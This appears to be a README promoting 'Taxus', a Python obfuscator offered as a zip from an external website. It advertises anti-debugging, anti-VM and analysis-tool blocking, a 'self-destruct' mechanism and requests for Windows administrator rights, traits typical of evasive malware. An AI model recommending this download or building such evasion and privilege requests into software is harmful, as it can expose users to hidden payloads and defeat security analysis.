**Taxus** is an advanced, multi-layered obfuscator for Python designed to transform your code into a protected, unreadable format. It provides military-grade protection for your intellectual property against reverse engineering, AI-based analysis, and unauthorized access.

***

## ‚ú® Key Features

* **üõ°Ô∏è Triple-Layer Encryption**: Your code undergoes three distinct encryption layers, each with a unique algorithm, making manual or automated decryption nearly impossible.
* **ü§ñ AI-Resistant**: Employs specialized techniques to confuse and prevent AI-based deobfuscation tools from successfully analyzing the protected code's logic.
* **üêû Anti-Debugging & Anti-VM**: Includes advanced, real-time detection mechanisms to identify and terminate the script if it's being run in a debugging or virtualized environment.
* **üß† Memory Protection**: Sensitive data and decrypted code segments are securely wiped from memory after use, preventing memory dumping and extraction attacks.
* **‚öôÔ∏è AST-Based Obfuscation**: Manipulates the Abstract Syntax Tree (AST) for deep, structural code transformation that obscures logic while perfectly preserving functionality.

## üöÄ Download & Installation

You can download the latest version of the Taxus Obfuscator directly from our website.

**[‚û°Ô∏è Download Taxus Obfuscator v2.0.1](https://gettaxus.vercel.app/PythonObfuscator.html)**

The download is a `.zip` file containing the obfuscator script, an installation guide, and example files.

1.  **Unzip the file**: Extract the contents of `obfuscator.zip`.
2.  **Install dependencies**: Taxus requires a few packages to enable its full protection suite. You can install them via pip:
    ```bash
    pip install psutil astor pycryptodome
    ```

***

## üíª How to Use

Using the obfuscator is straightforward. Simply run the main script from your terminal and provide the path to the Python file you want to protect.

1.  **Run the Obfuscator**:
    ```bash
    python TaxusObfuscator.py your_script.py
    ```
2.  **Get the Protected File**: The tool will process your code and generate a new file, typically named `your_script_protected.py`, in the same directory. This new file is fully protected and ready for distribution.

### Example Transformation

Here‚Äôs a simple "before and after" to demonstrate the power of Taxus.

<table>
<thead>
  <tr>
    <th>Original Code (your_script.py)</th>
    <th>Obfuscated Code (your_script_protected.py)</th>
  </tr>
</thead>
<tbody>
<tr>
<td valign="top">
<pre lang="python">
def calculate_sum(a, b):
    result = a + b
    return result

total = calculate_sum(10, 20)
print(f"The sum is: {total}")
</pre>
</td>
<td valign="top">
<pre lang="python">
taxus_item_609 = "TAXUS_..."
d0yok9h1uui4 = lambda: ...
try:
    d0yok9h1uui4()
except:
    pass

import base64, zlib, ...

# ... hundreds of lines of 
# obfuscated functions, 
# integrity checks, and 
# encrypted data segments.
</pre>

## üõ°Ô∏è Protection Details

* **Self-Destruct Mechanism**: The protected file contains brand signatures. If these are tampered with or removed, the script will refuse to run or may self-destruct.
* **Analysis Blocking**: Actively detects and blocks common analysis tools like `IDA`, `Ghidra`, `x64dbg`, and Python's native `sys.gettrace`.
* **Admin Privileges**: The protected script may request administrator privileges on Windows to install necessary dependencies for its security features.
* **Cross-Platform**: Compatible with Python 3.6+ on Windows and Linux.
